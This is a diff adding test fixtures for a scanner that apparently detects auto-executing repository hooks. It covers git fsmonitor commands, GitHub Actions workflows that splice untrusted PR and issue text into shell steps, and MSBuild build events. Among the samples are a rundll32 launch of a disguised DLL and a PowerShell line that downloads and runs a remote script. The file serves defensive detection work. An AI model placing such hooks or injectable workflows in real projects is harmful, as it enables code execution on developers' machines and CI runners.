@@ -422,6 +422,12 @@ RC-AUTO-032:
           [core]
           	fsmonitor = ./.git/fsm.sh
       expect: [{path: .git/config, line: 2}]
+    - name: bare repository buried in a subfolder
+      files:
+        fixtures/demo.git/HEAD: "ref: refs/heads/main\n"
+        fixtures/demo.git/config: "[core]\n\trepositoryformatversion = 0\n\tbare = true\n\tfsmonitor = \"echo dummy\"\n"
+        fixtures/demo.git/refs/heads/main: "0000000000000000000000000000000000000000\n"
+      expect: [{path: fixtures/demo.git/config, line: 4}]
   negative:
     - name: built-in fsmonitor switched on
       files:
@@ -429,6 +435,11 @@ RC-AUTO-032:
     - name: fsmonitor as a bare switch
       files:
         .git/config: "[core]\n\tfsmonitor\n\tuntrackedcache = true\n"
+    - name: other files named config are not parsed
+      files:
+        .dvc/config: "[core]\n    remote = storage\n['remote \"storage\"']\n    url = s3://example-bucket/dvc\n"
+        deploy/config: "fsmonitor: off\nname = x\n"
+        tests/data/bare.git/config: "[core]\n\tbare = true\n\tfsmonitor = false\n"
 
 RC-AUTO-040:
   positive:
@@ -856,6 +867,95 @@ RC-AUTO-061:
               steps:
                 - run: pytest -q
 
+RC-AUTO-062:
+  positive:
+    - name: pull request title in a pull_request_target run step
+      files:
+        .github/workflows/pr-title.yml: |
+          on:
+            pull_request_target:
+              types: [opened, edited]
+          jobs:
+            validate:
+              runs-on: ubuntu-latest
+              steps:
+                - run: echo "${{ github.event.pull_request.title }}" > title.txt
+      expect: [{path: .github/workflows/pr-title.yml, line: 8}]
+    - name: comment body in github-script under issue_comment
+      files:
+        .github/workflows/bot.yaml: |
+          on: issue_comment
+          jobs:
+            reply:
+              runs-on: ubuntu-latest
+              steps:
+                - uses: actions/github-script@v7
+                  with:
+                    script: |
+                      const body = `${{ github.event.comment.body }}`;
+      expect: [{path: .github/workflows/bot.yaml, line: 9}]
+    - name: issue title under an issues trigger with types
+      files:
+        .github/workflows/triage.yml: |
+          on:
+            issues:
+              types: [opened]
+          permissions:
+            issues: write
+          jobs:
+            label:
+              runs-on: ubuntu-latest
+              steps:
+                - run: |
+                    echo "triaging"
+                    ./label.sh "${{ github.event.issue.title }}"
+      expect: [{path: .github/workflows/triage.yml, line: 12}]
+    - name: branch name in a composite action
+      files:
+        action.yml: |
+          name: Format
+          runs:
+            using: composite
+            steps:
+              - shell: bash
+                run: |
+                  git pull origin ${{ github.head_ref || github.ref }}
+      expect: [{path: action.yml, line: 7}]
+  negative:
+    - name: untrusted text passed through env
+      files:
+        .github/workflows/pr-title.yml: |
+          on: pull_request_target
+          jobs:
+            validate:
+              runs-on: ubuntu-latest
+              steps:
+                - run: echo "$TITLE" > title.txt
+                  env:
+                    TITLE: ${{ github.event.pull_request.title }}
+                - if: ${{ contains(github.event.pull_request.title, 'WIP') }}
+                  run: exit 1
+    - name: pull_request trigger with issue permissions
+      files:
+        .github/workflows/ci.yml: |
+          on: pull_request
+          permissions:
+            issues: write
+          jobs:
+            t:
+              runs-on: ubuntu-latest
+              steps:
+                - run: echo "${{ github.event.pull_request.title }}"
+    - name: trusted values in a privileged workflow
+      files:
+        .github/workflows/label.yml: |
+          on: pull_request_target
+          jobs:
+            l:
+              runs-on: ubuntu-latest
+              steps:
+                - run: gh pr edit ${{ github.event.pull_request.number }} --add-label ok --repo ${{ github.repository }}
+
 RC-AUTO-070:
   positive:
     - name: Exec task in a project file
@@ -877,7 +977,39 @@ RC-AUTO-070:
             </Target>
           </Project>
       expect: [{path: Directory.Build.targets, line: 3}]
+    - name: pre-build event in a Visual Studio project
+      files:
+        Exploit.vcxproj: |
+          <Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+            <ItemDefinitionGroup>
+              <PreBuildEvent>
+                <Command>rundll32.exe "$(ProjectDir)lib\helper.db",Start</Command>
+              </PreBuildEvent>
+            </ItemDefinitionGroup>
+          </Project>
+      expect: [{path: Exploit.vcxproj, line: 3}]
+    - name: post-build event in an old-style C# project
+      files:
+        Legacy/Legacy.csproj: |
+          <Project ToolsVersion="15.0">
+            <PropertyGroup>
+              <PostBuildEvent>copy "$(TargetPath)" "$(SolutionDir)bin"</PostBuildEvent>
+            </PropertyGroup>
+          </Project>
+      expect: [{path: Legacy/Legacy.csproj, line: 3}]
   negative:
+    - name: empty build events
+      files:
+        App.vcxproj: |
+          <Project>
+            <ItemDefinitionGroup>
+              <PreBuildEvent>
+                <Command>
+                </Command>
+              </PreBuildEvent>
+              <PostBuildEvent></PostBuildEvent>
+            </ItemDefinitionGroup>
+          </Project>
     - name: project without Exec
       files:
         App.csproj: |
@@ -905,7 +1037,21 @@ RC-AUTO-071:
             </Target>
           </Project>
       expect: [{path: App.csproj, line: 3}]
+    - name: post-build event downloads and runs a script
+      files:
+        Tool.vcxproj: |
+          <Project>
+            <ItemDefinitionGroup>
+              <PostBuildEvent>
+                <Command>powershell -c "iwr https://example.invalid/a.ps1 | iex"</Command>
+              </PostBuildEvent>
+            </ItemDefinitionGroup>
+          </Project>
+      expect: [{path: Tool.vcxproj, line: 3}]
   negative:
+    - name: build event with a local command
+      files:
+        Tool.vcxproj: "<Project><PostBuildEvent><Command>xcopy /y out bin</Command></PostBuildEvent></Project>\n"
     - name: Exec with a local command
       files:
         App.csproj: |
